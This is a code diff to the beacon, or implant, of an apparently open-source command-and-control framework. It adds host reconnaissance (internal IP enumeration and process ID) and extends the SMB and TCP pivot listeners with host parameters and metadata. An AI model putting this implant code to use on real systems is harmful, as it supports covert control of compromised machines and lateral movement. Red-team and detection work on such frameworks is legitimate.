@@ -41,7 +41,115 @@ using namespace std;
 
 
 #ifdef __linux__
+
+
+#include <ifaddrs.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <cstring>
+
+
+std::string getInternalIP() 
+{
+    struct ifaddrs* ifAddrStruct = nullptr;
+    getifaddrs(&ifAddrStruct);
+
+	std::string ips = "";
+    for (struct ifaddrs* ifa = ifAddrStruct; ifa != nullptr; ifa = ifa->ifa_next) 
+	{
+        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) 
+		{
+            void* tmpAddrPtr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
+            char addressBuffer[INET_ADDRSTRLEN];
+            inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
+
+            // Filter out loopback
+            if (std::string(ifa->ifa_name) != "lo")
+			{
+                std::cout << "Internal IP (" << ifa->ifa_name << "): " << addressBuffer << std::endl;
+				ips += "ifa->ifa_name ";
+				ips += ifa->ifa_name;
+				ips += " ";
+				ips += addressBuffer;
+				ips += ";";
+			}
+        }
+    }
+    if (ifAddrStruct) 
+		freeifaddrs(ifAddrStruct);
+	
+	return ips;
+}
+
+
+int getCurrentPID() 
+{
+    return static_cast<int>(getpid());
+}
+
+
 #elif _WIN32
+
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
+#include <iostream>
+
+
+#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "Iphlpapi.lib")
+
+
+std::string getInternalIP() 
+{
+    WSADATA wsaData;
+    char hostname[256];
+
+	std::string ips = "";
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
+	{
+        return ips;
+    }
+
+    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) 
+	{
+        WSACleanup();
+        return ips;
+    }
+
+    struct addrinfo hints = {}, *result = nullptr;
+    hints.ai_family = AF_INET;  // IPv4
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) 
+	{
+        WSACleanup();
+        return ips;
+    }
+
+    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) 
+	{
+        struct sockaddr_in* sockaddr_ipv4 = reinterpret_cast<struct sockaddr_in*>(ptr->ai_addr);
+        char ipStr[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ipStr, sizeof(ipStr));
+		ips += ipStr;
+		ips += ";";
+    }
+
+    freeaddrinfo(result);
+    WSACleanup();
+
+	return ips;
+}
+
+
+int getCurrentPID() 
+{
+    return static_cast<int>(GetCurrentProcessId());
+}
+
 
 enum IntegrityLevel 
 {
@@ -51,6 +159,7 @@ enum IntegrityLevel
 	MEDIUM_INTEGRITY,
 	HIGH_INTEGRITY,
 };
+
 
 IntegrityLevel GetCurrentProcessIntegrityLevel() 
 {
@@ -113,6 +222,12 @@ Beacon::Beacon()
 	m_aliveTimerMs = 1000;
 
 	srand(time(NULL));
+
+	std::string ips = getInternalIP();
+	std::cout << "ips " << ips << std::endl;
+
+	int pid = getCurrentPID();
+	std::cout << "pid " << pid << std::endl;
 
 #ifdef __linux__
 
@@ -428,15 +543,17 @@ bool Beacon::runTasks()
 			return exit; 
 	}
 
-	// For every listener add a proof of life to the result list that will be use to create the response message
-	// It's usefull in case of link with the beacon die and is then reinstated
+	// For each listener, add a proof-of-life entry to the result list.
+	// This ensures the response message includes current listener state,
+	// which is useful if the connection with a beacon is lost and later restored.
 	for(int i=0; i<m_listeners.size(); i++)
 	{
 		C2Message listenerProofOfLife;
 
-		std::string listenerHash = m_listeners[i]->getListenerHash();
 		listenerProofOfLife.set_instruction(ListenerPollCmd);
-		listenerProofOfLife.set_returnvalue(listenerHash);
+		listenerProofOfLife.set_data(m_listeners[i]->getListenerHash());
+		listenerProofOfLife.set_returnvalue(m_listeners[i]->getListenerMetadata());
+
 
 		m_taskResult.push(listenerProofOfLife);
 	}
@@ -518,11 +635,15 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		{
 			if(splitedCmd[1]==ListenerSmbType)
 			{
-				std::string pipeName = splitedCmd[2];
+				if(splitedCmd.size()!=4)
+					return false;
+				
+				std::string host = splitedCmd[2];
+				std::string pipeName = splitedCmd[3];
 
 				std::vector<unique_ptr<Listener>>::iterator object = 
 					find_if(m_listeners.begin(), m_listeners.end(),
-							[&](unique_ptr<Listener> & obj){ return obj->getParam1() == pipeName;}
+							[&](unique_ptr<Listener> & obj){ return obj->getParam2() == pipeName;}
 							);
 
 				if(object!=m_listeners.end())
@@ -532,18 +653,24 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 				}
 				else
 				{
-					std::unique_ptr<ListenerSmb> listenerSmb = make_unique<ListenerSmb>(pipeName);
-					std::string listenerHash = listenerSmb->getListenerHash();
+					std::unique_ptr<ListenerSmb> listenerSmb = make_unique<ListenerSmb>(host, pipeName);
+					
+					std::string hash = listenerSmb->getListenerHash();
+					std::string metadata = listenerSmb->getListenerMetadata();
+
 					m_listeners.push_back(std::move(listenerSmb));
 
-					// Respond with the listener hash
 					c2RetMessage.set_cmd(cmd);
-					c2RetMessage.set_returnvalue(listenerHash);
+					c2RetMessage.set_data(metadata);
+					c2RetMessage.set_returnvalue(hash);
 					return false;
 				}
 			}
 			else if(splitedCmd[1]==ListenerTcpType)
 			{
+				if(splitedCmd.size()!=4)
+					return false;
+
 				std::string localHost = splitedCmd[2];
 				int localPort;
 				try
@@ -572,10 +699,14 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 					int ret = listenerTcp->init();
 					if (ret>0)
 					{
-						std::string listenerHash = listenerTcp->getListenerHash();
+						std::string hash = listenerTcp->getListenerHash();
+						std::string metadata = listenerTcp->getListenerMetadata();
+
 						m_listeners.push_back(std::move(listenerTcp));
+						
 						c2RetMessage.set_cmd(cmd);
-						c2RetMessage.set_returnvalue(listenerHash);
+						c2RetMessage.set_data(metadata);
+						c2RetMessage.set_returnvalue(hash);
 						return false;
 					} 
 					else 
